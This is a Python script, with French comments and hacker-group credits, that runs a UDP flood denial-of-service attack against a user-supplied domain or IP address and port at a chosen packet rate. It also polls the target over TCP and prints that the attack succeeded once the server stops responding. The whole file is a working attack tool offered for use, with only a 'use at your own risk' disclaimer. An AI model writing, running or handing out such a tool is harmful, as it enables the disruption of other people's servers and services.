import os
import socket
import threading
import time

# Informations sur le script
INFO = """
Script creator: •FAMOUS TECH• OR •FD LORD•
Script design: FD LORD
Legion: DEDSEC TM
Info: USE THIS SCRIPT AT YOUR OWN RISK

Collaborators:
- Lord____Z
- ×_topher_×

Options:
1. Domain
2. IP Address
3. Quit
"""

# Variables globales
stop_attack = False
attack_interval = 5  # Intervalle en secondes pour vérifier l'état du serveur

# Fonction pour effectuer une attaque DDoS sur un domaine
def attack_domain(domain, port, rate):
    global stop_attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1024)
    target_ip = socket.gethostbyname(domain)
    while not stop_attack:
        sock.sendto(bytes, (target_ip, port))
        print(f"Attacking {domain}:{port} with {rate} requests per second")
        time.sleep(1 / rate)

# Fonction pour effectuer une attaque DDoS sur une adresse IP
def attack_ip(ip, port, rate):
    global stop_attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1024)
    while not stop_attack:
        sock.sendto(bytes, (ip, port))
        print(f"Attacking {ip}:{port} with {rate} requests per second")
        time.sleep(1 / rate)

# Fonction pour vérifier l'état du serveur
def check_server(target, port):
    global stop_attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while not stop_attack:
        try:
            sock.connect((target, port))
            print("Server is up.")
        except socket.error:
            print("DDoS attack successs!!!!!!")
            stop_attack = True
        time.sleep(attack_interval)

# Fonction pour mettre à jour le script
def update_script():
    os.system('git pull')
    print("Script updated successfully.")

# Menu principal
def main():
    global stop_attack
    print(INFO)
    target = input("Enter the target (domain or IP address): ")
    port = int(input("Enter the port: "))
    rate = int(input("Enter the rate (requests per second): "))
    
    if target.isdigit():
        attack_thread = threading.Thread(target=attack_ip, args=(target, port, rate))
    else:
        attack_thread = threading.Thread(target=attack_domain, args=(target, port, rate))

    server_check_thread = threading.Thread(target=check_server, args=(target, port))

    attack_thread.start()
    server_check_thread.start()

    attack_thread.join()
    server_check_thread.join()

    if not stop_attack:
        print("DDOS attack failed. Press Control + C and try again.")

if __name__ == "__main__":
    main()
